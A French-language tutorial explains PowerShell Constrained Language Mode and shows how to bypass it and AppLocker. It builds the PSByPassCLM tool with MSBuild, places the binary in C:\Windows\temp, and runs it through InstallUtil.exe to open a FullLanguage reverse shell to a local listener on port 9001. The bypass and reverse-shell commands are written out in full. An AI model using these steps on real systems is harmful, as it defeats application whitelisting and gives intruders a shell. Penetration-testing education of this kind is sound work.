---
title: "[AppLocker CLM] Bypass le mode de langage contraint en PowerShell"
description: clm.jpg
tags: ["Dans cet article je vous présente le système CLM (Constrained Language Mode) vous montrez le fonctionnement et de vous montrez comment bypass ce système qui vous donne pas assez de permissions dans un système PowerShell."]
---

![Flower](../clm.jpg)

Introduction
----
Dans ce cours à but éducatif nous allons voir `COMMENT BYPASS CONSTRAINED LANGUAGE MODE (CLM)` ou en français (Mode de langage contraint) sous PowerShell grâce à l'outil `PSByPassCLM`, téléchargeable sur [GITHUB](https://github.com/padovah4ck/PSByPassCLM). C'est un outil très utile en `PENTEST` et je devais absolument vous présenter ça. <br />

Cet outil permet d'avoir beaucoup plus de permissions dans une session `PowerShell` et exécuter des commandes comme par exemple télécharger des fichiers sur un système à distance et bien d'autre chose. <br />

CLM
----
Avant d'aller vers le technique, il faut avant tout comprendre le système `CLM`. Il s’agit d’une restriction qui vous empêche d’abuser de nombreuses fonctionnalités de powershell et de vous en servir pour énumérer, augmenter les privilèges, organiser des charges utiles et une tonne d’autres éléments. C'est `AppLocker` qui limite tout et bloque les accès.

Il y'a `4 modes` en particulier en PowerShell : 

- FullLanguage
- ConstrainedLanguage
- RestrictedLanguage
- NoLanguage

Actuellement je suis en mode `FullLanguage`, si vous souhaitez voir le mode `$ExecutionContext.SessionState` :

![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559581679-screenshot-2.png)

Comme vous pouvez le voir, je suis en mode `FullLanguage`, cette fonctionnalité designe que justement j'ai les permissions pour exécuter des tâches (Ce qui est plutôt cool).

Mais dans certains cas vous pouvez voir ce type de chose pour éviter que les intrus exécutent n'importe quoi ou bien pour la sécurité : <br />

![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559586084-screenshot-4.png)

Concrètement comme vous pouvez le voir je suis en mode `ConstrainedLanguage`, vous ne pouvez pas par exemple exécuter un fichier à distance, télécharger des fichiers à distance etc..

.NET
----
Avant de commencer les choses nous devons commencer par télécharger le framework `.NET`. Le .NET Framework est un cadriciel pouvant être utilisé par un système d'exploitation Microsoft Windows et Microsoft Windows Mobile depuis la version 5.

Commencer par ouvrir `Exécuter` avec la touche `WINDOWS + R` et ensuite de saisir `appwiz.cpl` et ensuite d'aller vers `Activer ou désactiver des fonctionnalités Windows`. Chercher ce système `.NET Framework 3.5 (inclut .NET 2.0 et 3.0)` (pour mon cas). Vous cochez la petite case et ensuite vous appuyez sur `OK` afin d'installer `.NET` sur votre ordinateur.

![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559583478-screenshot-5.png)

Build
----
Allez dans les dossiers de `.NET` pour build le fichier `.sln` dans le dossier `PSByPassCLM-master`.

    PS C:\Users\Administrateur> cd C:\Windows\Microsoft.NET\Framework64\v4*
    PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319> .\MSBuild.exe C:\Users\Administrateur\Desktop\PSByPassCLM-master\PSBypassCLM\PsBypassCLM.sln
 
Et pendant ce temps là dans le dossier `*\PSByPassCLM-master\PSBypassCLM\PSBypassCLM\bin\Debug\PsBypassCLM` il a crée un fichier exécutable et ce fichier va nous permettre de changer de mode dans une session PowerShell.

Reverse Shell
----
Donc nous arrivons presque à la fin pour effectuer notre reverse shell, nous allons utiliser l'outil `InstallUtil.exe` dans le même dossier que `MSBuild.exe`. Avant ça je vais crée un `listener` qui écoute le port `9001`.

![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559585369-screenshot-1.png)

Et enfin de saisir cette commande pour effectuer notre reverse shell et être en mode `FullLanguage` dans notre système PowerShell (that's cool) : 

    PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=localhost /rport=9001 /U c:\windows\temp\PsBypassCLM.exe

Ah oui un détail assez important n'oublier surtout pas de mettre le fichier `PsBypassCLM.exe` dans `C:\Windows\temp\PsBypassCLM.exe` pour Bypass `AppLocker`.

![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559585660-screenshot-2.png)

Et enfin pendant ce temps là dans notre `listener` j'ai accès à un shell en mode `FullLanguage` et pour pouvoir exécuter des commandes dans le système.

![Flower](https://image.noelshack.com/fichiers/2019/23/1/1559585801-screenshot-3.png)

C'est un tutorial assez simple et assez rapide, pour vous présentez le fonctionnement de ce système.

